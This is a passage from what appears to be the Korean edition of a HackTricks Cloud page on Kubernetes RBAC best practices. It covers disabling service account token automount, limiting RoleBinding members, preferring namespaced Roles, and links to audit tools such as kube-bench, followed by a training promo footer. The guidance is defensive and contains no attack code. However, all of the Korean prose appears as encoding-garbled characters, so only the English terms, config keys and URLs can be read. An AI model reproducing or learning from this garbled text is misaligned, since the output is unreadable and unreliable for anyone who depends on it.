## ëª¨ë²” ì‚¬ë¡€

### **ì„œë¹„ìŠ¤ ê³„ì • í† í°ì˜ ìë™ ë§ˆìš´íŠ¸ ë¹„í™œì„±í™”**

* **Pods ë° ì„œë¹„ìŠ¤ ê³„ì •**: ê¸°ë³¸ì ìœ¼ë¡œ podsëŠ” ì„œë¹„ìŠ¤ ê³„ì • í† í°ì„ ë§ˆìš´íŠ¸í•©ë‹ˆë‹¤. ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ KubernetesëŠ” ì´ ìë™ ë§ˆìš´íŠ¸ ê¸°ëŠ¥ì„ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤.
* **ì ìš© ë°©ë²•**: Kubernetes ë²„ì „ 1.6ë¶€í„° ì„œë¹„ìŠ¤ ê³„ì • ë˜ëŠ” podsì˜ êµ¬ì„±ì—ì„œ `automountServiceAccountToken: false`ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.

### **RoleBindings/ClusterRoleBindingsì—ì„œ ì œí•œì ì¸ ì‚¬ìš©ì í• ë‹¹**

* **ì„ íƒì  í¬í•¨**: RoleBindings ë˜ëŠ” ClusterRoleBindingsì— í•„ìš”í•œ ì‚¬ìš©ìë§Œ í¬í•¨ë˜ë„ë¡ í•©ë‹ˆë‹¤. ì •ê¸°ì ìœ¼ë¡œ ê°ì‚¬í•˜ê³  ê´€ë ¨ ì—†ëŠ” ì‚¬ìš©ìë¥¼ ì œê±°í•˜ì—¬ ë³´ì•ˆì„ ìœ ì§€í•©ë‹ˆë‹¤.

### **í´ëŸ¬ìŠ¤í„° ì „ì²´ ì—­í• ë³´ë‹¤ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ íŠ¹ì • ì—­í•  ì‚¬ìš©**

* **Roles vs. ClusterRoles**: í´ëŸ¬ìŠ¤í„° ì „ì²´ì— ì ìš©ë˜ëŠ” ClusterRoles ë° ClusterRoleBindingsë³´ë‹¤ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ íŠ¹ì • ê¶Œí•œì— ëŒ€í•´ Roles ë° RoleBindingsë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ ë” ì„¸ë°€í•œ ì œì–´ë¥¼ ì œê³µí•˜ê³  ê¶Œí•œì˜ ë²”ìœ„ë¥¼ ì œí•œí•©ë‹ˆë‹¤.

### **ìë™í™” ë„êµ¬ ì‚¬ìš©**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **ì°¸ê³  ë¬¸í—Œ**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
